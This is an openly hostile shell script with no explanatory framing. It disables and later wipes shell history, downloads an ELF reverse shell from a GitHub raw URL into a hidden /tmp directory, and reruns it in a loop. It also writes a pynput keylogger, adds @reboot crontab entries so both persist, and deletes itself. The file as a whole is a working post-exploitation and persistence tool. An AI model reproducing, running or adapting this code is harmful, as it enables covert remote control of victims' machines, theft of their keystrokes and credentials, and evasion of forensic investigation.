#!/bin/sh

unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0
set +o history 2>/dev/null

# Config
ATTACKER_HOST="172.16.17.39"
ELF_URL="https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf"
TMP_DIR="/tmp/.sysd"
ELF_PATH="$TMP_DIR/shell.elf"
LOOP_SCRIPT="$TMP_DIR/loop.sh"
KEYLOGGER="$TMP_DIR/keylogger.py"
CRON_TMP="/tmp/.cronbk"

# Create temp dir
mkdir -p "$TMP_DIR"

# Download and run ELF reverse shell (looped)
curl -s -o "$ELF_PATH" "$ELF_URL"
chmod +x "$ELF_PATH"

# Loop script to ensure reconnection
cat > "$LOOP_SCRIPT" <<EOF
#!/bin/sh
while true; do
  "$ELF_PATH" >/dev/null 2>&1
  sleep 10
done
EOF
chmod +x "$LOOP_SCRIPT"

# Lightweight keylogger using pynput
cat > "$KEYLOGGER" <<EOF
from pynput import keyboard
def on_press(key):
    try:
        with open("$TMP_DIR/keys.log", "a") as f:
            f.write(str(key) + "\\n")
    except:
        pass
with keyboard.Listener(on_press=on_press) as l:
    l.join()
EOF

# Add persistence to crontab
crontab -l 2>/dev/null > "\$CRON_TMP"
echo "@reboot bash $LOOP_SCRIPT &" >> "\$CRON_TMP"
echo "@reboot python3 $KEYLOGGER &" >> "\$CRON_TMP"
crontab "\$CRON_TMP"
rm -f "\$CRON_TMP"

# Run immediately
bash "$LOOP_SCRIPT" >/dev/null 2>&1 &
python3 "$KEYLOGGER" >/dev/null 2>&1 &

# Wipe bash & zsh history
sleep 1
rm -f ~/.bash_history ~/.zsh_history
history -c 2>/dev/null

# Self delete (script itself)
[ -f "$0" ] && rm -- "$0"

exit 0
